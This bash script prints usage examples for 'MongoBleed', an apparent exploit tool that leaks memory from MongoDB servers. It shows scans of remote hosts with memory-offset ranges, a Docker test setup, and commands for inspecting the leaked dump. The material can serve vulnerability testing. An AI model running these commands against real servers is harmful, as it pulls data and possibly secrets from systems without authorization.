#!/bin/bash
# MongoBleed Go Implementation - Example Usage Scripts

echo "MongoBleed Go Implementation - Example Usage"
echo "============================================"
echo ""

# Check if mongobleed is built
if [ ! -f "./mongobleed" ]; then
    echo "Error: mongobleed binary not found. Please run 'make build' first."
    exit 1
fi

echo "1. Basic scan against localhost"
echo "./mongobleed"
echo ""

echo "2. Scan against remote target"
echo "./mongobleed --host 192.168.1.100"
echo ""

echo "3. Deep scan for more data (recommended)"
echo "./mongobleed --host localhost --max-offset 50000"
echo ""

echo "4. Custom port and range"
echo "./mongobleed --host target.com --port 27017 --min-offset 100 --max-offset 20000"
echo ""

echo "5. Custom output file"
echo "./mongobleed --host localhost --output custom_leak.bin"
echo ""

echo "6. Full command with all options"
echo "./mongobleed --host 192.168.1.100 --port 27017 --min-offset 20 --max-offset 100000 --output deep_scan.bin"
echo ""

echo "7. Test against Docker instance"
echo "# First, start MongoDB in Docker:"
echo "docker run -d -p 27017:27017 --name mongodb mongo:6.0"
echo "# Then run the exploit:"
echo "./mongobleed --host localhost"
echo ""

echo "Viewing Results:"
echo "==============="
echo "strings leaked.bin | less          # View readable strings"
echo "hexdump -C leaked.bin | less       # View hex dump"
echo "binwalk leaked.bin                 # Extract embedded files"
echo ""

echo "Build Instructions:"
echo "=================="
echo "make build          # Build for current platform"
echo "make build-all      # Build for all platforms"
echo "make clean          # Clean build artifacts"
